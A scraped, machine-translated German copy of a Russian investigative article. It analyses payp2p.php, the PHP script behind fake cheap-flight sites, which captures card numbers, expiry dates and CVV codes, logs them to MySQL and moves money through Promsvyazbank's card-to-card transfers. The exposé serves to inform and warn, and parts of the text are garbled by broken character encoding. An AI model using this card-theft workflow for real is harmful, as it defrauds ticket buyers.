<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸº ğŸ˜¼ ğŸ™…ğŸ¾ GÃ¼nstige FlÃ¼ge ... Ein Netzwerk betrÃ¼gerischer Websites, die Geld von Karten stehlen. Die zweite Untersuchung. Was hat die Promsvyazbank damit zu tun? ğŸŒ©ï¸ ğŸ¤¹ğŸ¼ ğŸ¤°ğŸ¼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Vor ungefÃ¤hr einem Monat verÃ¶ffentlichte ich einen Artikel Ã¼ber Geektimes: â€GÃ¼nstige Flugtickets ... oder ein Netzwerk betrÃ¼gerischer Websites, die Ge...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>GÃ¼nstige FlÃ¼ge ... Ein Netzwerk betrÃ¼gerischer Websites, die Geld von Karten stehlen. Die zweite Untersuchung. Was hat die Promsvyazbank damit zu tun?</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/398313/"><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vor ungefÃ¤hr einem Monat verÃ¶ffentlichte ich einen Artikel Ã¼ber Geektimes: </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">â€GÃ¼nstige Flugtickets ... oder ein Netzwerk betrÃ¼gerischer Websites, die Geld von Karten stehlen. </font><font style="vertical-align: inherit;">Meine Untersuchung. " </font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die VerÃ¶ffentlichung erhielt eine groÃŸe Resonanz und eine unerwartete Fortsetzung ...</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich mÃ¶chte Sie an diejenigen erinnern, die den ersten Teil nicht gelesen haben. In einer auf realen FÃ¤llen basierenden VerÃ¶ffentlichung wurden Schemata beschrieben, mit denen BetrÃ¼ger Geld von Tickets von FlugticketkÃ¤ufern stehlen, die rÃ¼cksichtslos zu einer gefÃ¤lschten Ticketverkaufsstelle gelangen wollten. Die Anzahl solcher betrÃ¼gerischen Websites fÃ¼r den Verkauf von Flugtickets in RuNet liegt bei zehn und Hunderten (einschlieÃŸlich geschlossener). Auf solchen Websites werden dem Benutzer zunÃ¤chst echte Informationen zu FlÃ¼gen angezeigt. Es wird vorgeschlagen, eine Bestellung aufzugeben und diese mit einer Kreditkarte zu bezahlen. Alles sieht wunderschÃ¶n aus, bis KÃ¤ufer von Flugtickets feststellen, dass sie kein Geld und keine Tickets mehr haben.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In allen festgestellten FÃ¤llen nutzen solche Websites die Dienste von Banken, um Geld von Karte zu Karte (P2P) zu Ã¼berweisen, um Geld zu stehlen. Im ersten Teil wurde der Mechanismus, wie die Tinkov Bank-Seite fÃ¼r die Zahlung von Karte zu Karte getarnt und in betrÃ¼gerische Websites eingebettet wird, damit der â€KÃ¤uferâ€œ nichts bemerkt, ausfÃ¼hrlich beschrieben. Die Promsvyazbank wurde ebenfalls erwÃ¤hnt - durch ihn wurde in der beschriebenen Geschichte Geld von der Karte des Opfers gestohlen. Und wenn es bei der TKS-Bank keine Fragen mehr gab, war im Fall der Promsvyazbank nicht klar, wie das Geld abgehoben wurde. Das Hauptskript, mit dem Geld gestohlen wurde, wurde auf der Serverseite ausgefÃ¼hrt, und ohne Quellcode konnte man nur annehmen, was es tat.</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Und einer der Geektimes-Benutzer hat mich kontaktiert und das Skript payp2p.php gesendet, das kÃ¼rzlich auf den meisten betrÃ¼gerischen Websites fÃ¼r den Verkauf von Flugtickets verwendet wurde. </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dieses Skript verwendet den Promsvyazbank-Dienst, um von Karte zu Karte zu Ã¼bertragen. </font><font style="vertical-align: inherit;">Und meiner Meinung nach hat die Promsvyazbank mit ihrem Service, der leicht zu tÃ¤uschen war, zum Wachstum der Zahl der Internet-BetrÃ¼ger beigetragen.</font></font><a name="habracut"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es gibt wahrscheinlich andere Ã¤hnliche Banken, aber diese VerÃ¶ffentlichung wird sich hauptsÃ¤chlich mit der Promsvyazbank befassen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bevor wir mit der Analyse des Skripts selbst beginnen, wollen wir uns ansehen, wie die Zahlungsseite einer betrÃ¼gerischen Website aussah und wie die Ãœbersetzungsseite von einer Karte zu einer Promsvyazbank-Karte aussieht. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es sah aus wie die Zahlungsseite auf betrÃ¼gerischen Websites</font></font><br>
<img src="https://habrastorage.org/files/fe3/cf3/6d5/fe3cf36d5d294c8aa50b4338e9efde03.jpg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bei der Analyse des HTML-Codes dieser Zahlungsseite habe ich keine Teile der Seiten einer Bank gefunden, integrierte Iframes werden nicht verwendet, Skripte werden Ã¼berhaupt nicht verwendet, und die Seite selbst ist sehr einfach und sieht nicht wie die Seite der Promsvyazbank aus. Die in das Formular eingegebenen Daten werden nicht durch Skripte, sondern durch in Browser integrierte Mechanismen Ã¼berprÃ¼ft - unter Verwendung der Attribute "Muster" und "Erforderlich" fÃ¼r Eingabe-Eingabefelder und fÃ¼r ausgewÃ¤hlte Dropdown-Listen. Das heiÃŸt, Sogar die im Browser auf dem lokalen Laufwerk gespeicherte Seite bleibt dann "betriebsbereit" und kann verwendet werden, um zu testen, wie die Kartendaten abgefangen werden. Eine Ã¤hnliche zuvor gespeicherte Seite wurde als Teil dieser VerÃ¶ffentlichung verwendet, um die Funktionsweise des Skripts zu verstehen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
TatsÃ¤chlich ist diese Seite nur ein Formular zur Eingabe einer Kartennummer. </font><font style="vertical-align: inherit;">Wenn das Formular bestÃ¤tigt wurde, wird die Verarbeitung an das Programm payp2p.php Ã¼bertragen.</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"b-card-feature-list clearfix"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"formPay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"payp2p.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Payp2p.php kann alles. </font><font style="vertical-align: inherit;">Ihr Code war bisher fÃ¼r uns nicht verfÃ¼gbar, da er auf der Serverseite ausgefÃ¼hrt wird. </font><font style="vertical-align: inherit;">Aber wie ich bereits geschrieben habe, haben wir jetzt einen Code und wir werden alles wissen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nun wollen wir sehen, wie die Zahlungsseite auf der Website der Promsvyazbank von Karte zu Karte aussieht. </font></font><br>
<br>
<code>https://www.psbank.ru/Personal/eCommerce/Card2Card</code><br>
<img src="https://habrastorage.org/files/40d/469/71c/40d46971c2414e28bd4ef695c1e0d665.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie Sie sehen kÃ¶nnen, entspricht die Promsvyazbank-Seite Ã¼berhaupt nicht der zuvor dargestellten Zahlungsseite. </font><font style="vertical-align: inherit;">Auch die Anzahl der Eingabefelder fÃ¼r die Kartennummer stimmt nicht Ã¼berein. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Schauen wir uns den HTML-Code der PSB-Seite an, um herauszufinden, wie es funktioniert. </font><font style="vertical-align: inherit;">Alles, was wir wissen mÃ¼ssen, ist in diesen wenigen Zeilen:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"card2card"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/P2P/card_form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">seamless</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieses StÃ¼ck bedeutet, dass sich die reale Zahlungsseite auf einer anderen Domain befindet und das, was wir auf der Website der Promsvyazbank sehen, in einem â€Fensterâ€œ mit Iframe-Technologie angezeigt wird. </font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ich frage mich, wem die Domain 3ds.payment.ru gehÃ¶rt.</font></font></b><div class="spoiler_text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wir Ã¼berprÃ¼fen die Whois-Datenbank.</font></font><br>
<br>
<code> 3ds.payment.ru<br>
IP 193.200.10.116<br>
 : PRSBM-NET <br>
:<br>
inetnum: 193.200.10.0 - 193.200.10.255<br>
netname: PRSBM-NET<br>
mnt-by: PROMSVYAZBANK-MNT<br>
<br>
C    online.payment.ru<br>
<img src="https://habrastorage.org/files/78b/0d3/8be/78b0d38be13f47f58128095526817a54.png"><br>
</code><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Domain 3ds.payment.ru gehÃ¶rt ebenfalls zur Promsvyazbank. Wir werden uns an diese Domain erinnern, sie wird immer noch mehr als einmal in der Beschreibung zu finden sein. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mal sehen, was die Seite ist, die die Promsvyazbank auf ihrer Website und mÃ¶glicherweise auf einigen anderen Websites einbettet. </font></font><br>
<br>
<code>https://3ds.payment.ru/P2P/card_form.html</code><br>
<img src="https://habrastorage.org/files/bf7/543/441/bf754344157647e1acf1fb55454c3179.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dies ist eine echte Seite, die fÃ¼r Ãœbertragungen von Karte zu Karte verwendet wird. Wie Sie sehen kÃ¶nnen, ist diese Seite randlos. Dies geschieht absichtlich, um das Einbauen anderer Sites zu vereinfachen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im HTML-Code dieser Seite interessiert uns dieser Teil: </font></font><br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dies sind versteckte Eingabefelder zum Speichern von Serviceinformationen. Wir werden uns auch an diese Seite erinnern. Und wo es verwendet wird, wird spÃ¤ter beschrieben. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der EinfÃ¼hrungsteil ist beendet. Fahren wir mit dem interessantesten Teil fort und sehen, wie das Skript payp2p.php funktioniert oder wie es funktioniert.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Skript ist einfach und erfordert keine grÃ¼ndlichen Kenntnisse der PHP-Programmiersprache, um es zu verstehen. Der Einfachheit halber habe ich es in StÃ¼cke zerbrochen. Links sind die Zeilennummern aufgefÃ¼hrt, auf die verwiesen werden kann. Das Skript ist in der Form, in der es empfangen wurde, vÃ¶llig unverÃ¤ndert. Nach jedem Code werden eine EntschlÃ¼sselung und ein Beispiel fÃ¼r die Werte von Variablen wÃ¤hrend der ProgrammausfÃ¼hrung angezeigt (d. H. Ã„hnlich wie beim Debuggen). An einigen Stellen ist Ã¼bermÃ¤ÃŸiges Kommentieren mÃ¶glich - dies geschieht, damit nicht programmierende Leser auch die Bedeutung des Programmcodes verstehen kÃ¶nnen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zum Testen benÃ¶tigen wir ein Formular, in das Sie die Kartendaten eingeben mÃ¼ssen, mit denen die Zahlung erfolgen soll. Wir werden das zuvor gespeicherte Formular verwenden. Wie das Formular auf einer betrÃ¼gerischen Website aussah, zeigt das Bild am Anfang des Artikels. Ãœber das Formular wird weiter unten geschrieben. Geben Sie zum Testen die Kartennummer 1111.2222.3333.4444 ein. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fangen wir an. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f45/3a9/754/f453a9754241406eb6089527f5e25336.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 3 - fÃ¼hrt keine Befehle aus. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 4 - Eine separate Datei dbconfig.php wird geladen, in der die Parameter fÃ¼r die Verbindung zur MySQL-Datenbank gespeichert sind. Ein Screenshot des Codes dbconfig.php und seiner Analyse finden Sie unten.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 6 - Wir stellen eine Verbindung zum MySQL-Server her, in dessen Datenbank wir dann Daten Ã¼ber gestohlene Karten und vorgenommene Geldtransfers speichern. Diese Leitung stellt gleichzeitig eine Verbindung zum MySQL-Server her und beendet das Programm, wenn die Verbindung aus irgendeinem Grund fehlgeschlagen ist. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 11 - WÃ¤hlen Sie die Codierung fÃ¼r die Arbeit mit der MySQL-Datenbank aus. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 13 - Wir haben frÃ¼her eine Verbindung zum MySQL-Server hergestellt und wÃ¤hlen nun die Datenbank aus, mit der wir arbeiten mÃ¶chten. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Skript payp2p.php beginnt seine Arbeit, nachdem ein betrogener Benutzer ein Formular auf einer Seite ausgefÃ¼llt hat, die einer regulÃ¤ren Online-Zahlungsseite Ã¤hnelt. Durch Klicken auf die SchaltflÃ¤che â€Bezahlenâ€œ im Formular erhÃ¤lt das Skript payp2p.php die im Formular eingegebenen Daten. Die Daten vom Formular zum Skript werden mit der POST-Methode Ã¼bertragen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 16 - Die im Formular auf der vorherigen Seite eingegebene Kreditkartennummer wird in der Variablen $ num gespeichert. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 17 - Der Monat / das Jahr der GÃ¼ltigkeitsdauer der Karte wird in der Variablen $ date gespeichert. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 18 - Der CVV-Code der Karte wird in der Variablen $ cvv gespeichert. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 19 - In der Variablen $ code wird bei der Bestellung von Flugtickets frÃ¼her ein bestimmter Code generiert. Dieser Code wird verwendet, damit der Benutzer seine Bestellung Ã¼ber einen speziellen Link anzeigen kann. Der gleiche Code wird zur Identifizierung der Bestellung verwendet (auf der Zahlungsseite, um den Zahlungsbetrag automatisch anzuzeigen; wenn er im "Verkaufsbuch" gespeichert ist, das von BetrÃ¼gern gefÃ¼hrt wird; dieser Code wird auch an das Zahlungsformular Ã¼bertragen, wahrscheinlich als Ãœberweisungskennung (mehr dazu weiter unten).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 21-22 Eine Zeile wird gebildet - eine SQL-Abfrage, die dann ausgefÃ¼hrt wird. </font><font style="vertical-align: inherit;">Die SQL-Abfrage fÃ¼gt der Tabelle 'Karte' die Werte der Bestellkennung, den Betrag, die GÃ¼ltigkeitsdauer der Karte, den CVV-Code der Karte und die genaue aktuelle Zeit hinzu. </font><font style="vertical-align: inherit;">Ein Beispiel fÃ¼r einen Datensatz in der Datenbank finden Sie unten.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/051/283/424/0512834248fd4c1fa7498ed3f98e72e7.png"><br>
<br>
        Â« Â»      Â« Â».    ,     .    .<br>
<br>
"Ã¢Ã¡Ã¨Ã¢" = ''    ISO8859-1 =&gt;Windows-1251<br>
  ,  .  .</div></div> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenden Sie sich vorÃ¼bergehend der Datei dbconfig.php zu. </font></font><br>
<br>
<img src="https://habrastorage.org/files/100/d2a/13b/100d2a13b3544f60afeeab0efc768b85.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier sind die Parameter fÃ¼r die Verbindung zur Datenbank. </font><font style="vertical-align: inherit;">Was interessant sein mag:</font></font><br>
<br>
<blockquote>DBHOST â€”  ,    MySQL  (    MySQL     ,     ,       )<br>
DBNAME â€”   <br>
DBUSER â€”        MySQL<br>
DBPASS â€”       MySQL <br>
SECURE_AUTH_KEY â€”      -   .      ,   ,    , .     .</blockquote><br>
<img src="https://habrastorage.org/files/c5c/9bf/0b1/c5c9bf0b1afb4d8ba298ce8953076dee.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 28 - Eine aviacfg.php-Datei eines Drittanbieters ist verbunden. Dies ist eine Konfigurationsdatei, in der EmpfÃ¤ngerkartennummern und andere Einstellungen gespeichert sind. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 29 - Aus den Kartennummern, die durch einen Zeilenumbruch in der Konfigurationsdatei getrennt sind, wird ein Array erstellt. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 30-31 - Der Variablen $ crd wird zufÃ¤llig die Nummer einer der Karten zugewiesen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mal sehen, was wir in der Datei aviacfg.php haben</font></font><br>
<br>
<img src="https://habrastorage.org/files/14b/2bd/b16/14b2bdb16dc74b7990b743146d9bc72c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier sehen wir, dass die Variable $ aviacfg ein Array ist, das die Werte Rabatt (Rabatt) und Karten (Kartennummern, fÃ¼r die Auszahlungen erwartet werden) enthÃ¤lt. In diesem Beispiel gibt es nur eine Kartennummer, aber es kann eine beliebige Anzahl von ihnen geben. Der Name der Datei (aviacfg.php) und die Variable ($ aviacfg) selbst geben an, fÃ¼r welchen Bereich dieses Skript geschÃ¤rft wurde. Der Rabattwert bestimmt den Prozentsatz der Preise auf einer betrÃ¼gerischen Website, die billiger angezeigt werden, als sie tatsÃ¤chlich auf einer â€ehrlichenâ€œ Website fÃ¼r Flugtickets verkauft werden. Der Inhaber einer betrÃ¼gerischen Website kann den angezeigten Ticketpreis schnell gÃ¼nstiger machen. Je niedriger der angezeigte Preis ist, desto wahrscheinlicher ist es, dass einer der potenziellen KÃ¤ufer das Risiko eingeht, Tickets auf einer unbekannten Website zu kaufen. Ãœber den Rabatt wird es spÃ¤ter einen Kommentar geben, wie er genau im Code implementiert ist.</font></font><br>
<br>
<img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ferner werden der Ãœberweisungsbetrag, die Nummer der Karte, auf die die Ãœberweisung erfolgt, und der Code, der die Bestellung von Flugtickets auf einer betrÃ¼gerischen Website identifiziert, in der MySQL-Datenbank gespeichert. </font><font style="vertical-align: inherit;">Ein Beispiel fÃ¼r einen Datensatz in der Datenbank wird unten dargestellt.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/4ee/0e7/b46/4ee0e7b46d584bb68631adb4339b86e9.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/111/e13/e09/111e13e09e2246b4bbb9a3cdb6cab651.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 40 - Der Variablen $ p112 wird ein Wert mit der Kartennummer zugewiesen, die zuvor im Formular eingegeben wurde. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 41-51 - Die Kartennummer ist in vierstellige Teile unterteilt. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 53-57 - Die LÃ¤nge der Kartennummer wird Ã¼berprÃ¼ft. Wenn in der Kartennummer die Anzahl der Zeichen von 16 oder 18 abweicht, erfolgt ein Exit. Eine Nachricht wird fÃ¼nf Sekunden lang angezeigt und dann auf eine andere Seite umgeleitet. In diesem Beispiel erfolgt die RÃ¼ckgabe an die Bestellseite auf der betrÃ¼gerischen Website. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In Zeile 56 entspricht "Iaaa? Iua aaiiua ea? Ou" beim Konvertieren der Codierung ISO8859-1 =&gt; Windows-1251 dem Text: "UngÃ¼ltige Kartendaten." </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 58-61 - Den Variablen $ p4, $ p5, $ p6, $ p11 werden die zuvor im Formular eingegebenen Werte zugewiesen (Ablaufdatum der Karte, CVV-Code, Zahlungsbetrag).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 63 - In der Variablen $ info werden alle Kartendaten und der Ãœberweisungsbetrag gespeichert. </font><font style="vertical-align: inherit;">Beim Formen werden ZeilenumbrÃ¼che "\ n" und Trennzeichen "### ..." verwendet. </font><font style="vertical-align: inherit;">Diese Variable wird nirgendwo anders verwendet. </font><font style="vertical-align: inherit;">Wenn Sie das Skript fertigstellen, kÃ¶nnen Sie DatensÃ¤tze in einer normalen Textdatei speichern oder wÃ¤hrend des Debuggens anzeigen.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/413/f55/39d/413f5539d0fa45f3aee1853c62d0005f.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/347/9f7/0d5/3479f70d54804bb2b25f111021820c1c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 66-75 - Dies ist tatsÃ¤chlich eine Verdoppelung des Zeilenblocks 27-36. Die EmpfÃ¤ngerkarte wird erneut zufÃ¤llig aus der Konfigurationsdatei aviacfg.php ausgewÃ¤hlt und in der Datenbanktabelle card_balance gespeichert. Daher werden in der Tabelle card_balance bei jedem Ãœbertragungsversuch zwei DatensÃ¤tze erstellt. Wenn in aviacfg.php nur eine EmpfÃ¤ngerkarte verstopft ist, wird natÃ¼rlich immer dieselbe Karte ausgewÃ¤hlt. In diesem Fall werden die EintrÃ¤ge in der Tabelle card_balance einfach dupliziert. Falls jedoch mehrere Kartennummern in aviacfg.php verstopft sind, sind die Ergebnisse bei Zufallsstichproben unterschiedlich und es gibt einen Datensatz in der Tabelle card_balance, der erste ist falsch und der zweite ist korrekt.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dies ist ein Fehler, und KÃ¤ufer des Skripts (es wird einen separaten Kommentar dazu geben) kÃ¶nnen den Entwickler auffordern, den moralischen Schaden zu kompensieren, der damit verbunden ist, dass echte Ãœbersetzungen mindestens zweimal weniger sind als ProtokolleintrÃ¤ge.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/33b/867/4db/33b8674db56f462ba652d8caf33b418a.png"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r MySQL-DatenbankeintrÃ¤ge</font></font></b><div class="spoiler_text">        .           : Â«cardÂ»  Â«card_balanceÂ».               ,             .<br>
<br>
,         , â€”   .      .<br>
<br>
 Â«cardÂ».<br>
<br>
<img src="https://habrastorage.org/files/4e9/e3c/454/4e9e3c45420a4d84b73a857184fe7155.jpg"><br>
<br>
 Â«card_balanceÂ».<br>
<img src="https://habrastorage.org/files/98c/4a0/355/98c4a03559ba40e8a46adb2fdf950b54.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bitte beachten Sie, dass im ersten Fall nur die Absenderkarten ohne Betrag, aber mit der genauen Zeit in der MySQL-Datenbanktabelle gespeichert werden und im zweiten Fall Daten Ã¼ber die vorgenommenen Ãœbertragungen (genauer gesagt Ã¼ber die Ãœbertragungsversuche) gespeichert werden. </font><font style="vertical-align: inherit;">Die Kartennummer und der Betrag des EmpfÃ¤ngers werden gespeichert, die Absenderdaten werden nicht in der zweiten Tabelle gespeichert. </font><font style="vertical-align: inherit;">In beiden FÃ¤llen wird zusÃ¤tzlich die â€Bestellnummerâ€œ gespeichert.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
